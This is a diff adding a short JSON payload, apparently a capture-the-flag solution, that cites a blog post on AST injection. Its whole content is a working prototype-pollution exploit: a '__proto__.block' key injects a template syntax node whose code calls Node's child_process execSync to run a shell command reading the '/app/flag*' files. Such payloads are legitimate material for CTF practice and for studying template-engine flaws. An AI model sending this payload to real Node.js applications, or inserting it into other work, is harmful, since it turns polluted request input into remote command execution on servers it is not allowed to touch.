@@ -1,0 +1,9 @@
+https://blog.p6.is/AST-Injection/
+
+{
+    "__proto__.block": {
+        "type": "Text", 
+        "line": "process.mainModule.require('child_process').execSync('sh -c `cat /app/flag*`')"
+    },
+    "song.name": "Not Polluting with the boys"
+}
